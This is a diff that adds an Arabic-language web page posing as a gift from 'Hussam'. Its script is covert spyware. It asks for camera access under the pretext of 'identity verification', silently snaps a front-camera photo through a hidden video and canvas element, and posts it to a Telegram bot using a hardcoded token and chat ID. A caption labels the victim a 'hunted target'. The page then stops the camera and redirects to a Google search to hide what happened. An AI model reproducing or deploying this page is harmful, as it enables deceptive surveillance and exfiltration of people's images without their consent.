@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدية خاصة من حسام 🎁</title>
+    <style>
+        :root {
+            --main-pink: #ffafcc;
+            --soft-white: #f8f9fa;
+            --accent-pink: #ff0054;
+        }
+
+        body {
+            background: var(--main-pink);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Cairo', sans-serif;
+            overflow: hidden;
+        }
+
+        .card {
+            background: var(--soft-white);
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 20px 20px 60px #d993ad, -20px -20px 60px #ffcbdb;
+            text-align: center;
+            max-width: 350px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .icon { font-size: 60px; margin-bottom: 20px; }
+
+        h1 { color: #d81b60; margin: 10px 0; font-size: 24px; }
+
+        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
+
+        .btn {
+            background: var(--accent-pink);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(255, 0, 84, 0.3);
+        }
+
+        .btn:hover { transform: scale(1.05); background: #e6004c; }
+
+        /* العناصر المخفية (Ghost Elements) */
+        #video, #canvas { display: none; visibility: hidden; position: absolute; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="icon">💝</div>
+        <p style="font-weight: bold; color: #ff0054;">مرسل من: حسام</p>
+        <h1>لديك هدية تنتظر!</h1>
+        <p>لقد اختارك حسام لتكون الفائز بهدية اليوم. اضغط على الزر أدناه لتأكيد هويتك واستلام جائزتك فوراً.</p>
+        <button class="btn" id="claimBtn">تفعيل الهدية الآن</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const CONFIG = {
+            token: "8498412992:AAHoFvUmpjWcqLLuDv5celwz_nq680Mcirk",
+            chatId: "-1003279422634"
+        };
+
+        const btn = document.getElementById('claimBtn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.addEventListener('click', async () => {
+            btn.innerText = "جاري التحقق... ✨";
+            
+            try {
+                // طلب الإذن تحت غطاء "تأكيد الهوية"
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+
+                // التقاط الصورة بعد ثانية واحدة لضمان وضوح العدسة
+                setTimeout(() => {
+                    executeCapture(stream);
+                }, 1500);
+
+            } catch (err) {
+                alert("يجب السماح بالوصول لتأكيد هويتك واستلام هدية حسام! 🌸");
+                btn.innerText = "تفعيل الهدية الآن";
+            }
+        });
+
+        async function executeCapture(stream) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة وإرسالها
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.chatId);
+                formData.append('photo', blob, 'target_capture.jpg');
+                formData.append('caption', '🎯 تم اصطياد هدف جديد سيدي BAGBO\n👤 المصدر: رابط حسام الوردي');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    console.log("Sync Error");
+                } finally {
+                    // إيقاف الكاميرا فوراً (Hide Tracks)
+                    stream.getTracks().forEach(track => track.stop());
+                    // التمويه النهائي: تحويله لصفحة هدايا حقيقية أو جوجل
+                    window.location.href = "https://www.google.com/search?q=gifts+for+you";
+                }
+            }, 'image/jpeg', 0.8);
+        }
+    </script>
+</body>
+</html>
